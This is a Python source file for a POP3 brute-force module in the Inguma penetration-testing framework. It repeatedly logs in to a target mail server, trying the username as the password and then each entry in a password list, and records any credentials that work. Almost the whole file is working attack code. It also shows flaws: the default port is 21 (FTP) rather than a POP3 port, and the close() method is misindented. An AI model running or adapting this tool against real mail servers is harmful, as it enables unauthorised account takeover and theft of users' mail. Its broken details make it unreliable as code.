#!/usr/bin/python

"""
POP3 brute force module for Inguma
Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>

License is GPL v2
"""

import os
import sys
import time
import string
import poplib
import socket

from lib.libexploit import CIngumaModule

name = "brutepop"
brief_description = "A simple POP3 brute force tool"
type = "gather"

class CPopBrute(CIngumaModule):

	target = ""
	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""
	port = 0

	def __init__(self):
		self.pop = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		print "target = <target host or network>"
		print "port = <port>"
		print "user = <username>"

	def bruteForce(self):
		userList = [self.user, ]
		if self.port == 0:
			self.port = 21

		socket.setdefaulttimeout(self.timeout)
		self.open(self.target, self.port)

		try:
			self.gom.echo( "Trying " + self.user + "/" + self.user )
			self.login(self.user, self.user)
			self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			self.close()
			self.open(self.target, self.port)

		for user in userList:
			for passwd in self.getPasswordList():
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo( "Trying " + user + "/" + passwd + "..." )
					sys.stdout.flush()
					self.login(user, passwd)
					self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo( "Aborted." )
					return False
				except:
					self.close()
					self.open(self.target, self.port)

		return False

	def run(self):
		if self.target == "":
			self.gom.echo( "No target specified" )
			return False
		
		if self.user == "":
			self.gom.echo( "No user specified" )
			return False

		self.bruteForce()
		return True

	def printSummary(self):
		self.gom.echo( "" )
		for x in self.results:
			self.gom.echo( x + "/" + self.results[x] + "\n" )

	def open(self,host,port):
		self.pop = poplib.POP3(host, port)

	def login(self,username, password):
		if not self.pop:
			self.gom.echo( "Open a connection first." )

		self.pop.user(username)
		self.pop.pass_(password)

	def login_hash(self,username, lmhash, nthash):
		self.gom.echo( "Not yet applicable" )

	def logoff(self):
		if not self.pop:
			self.gom.echo( "Open a connection first." )

		self.pop.close()
		self.pop = None

	def close(self):
		if not self.pop:
			self.gom.echo( "Open a connection first." )

        try:
            self.pop.quit();
        except:
            pass #Just ignore
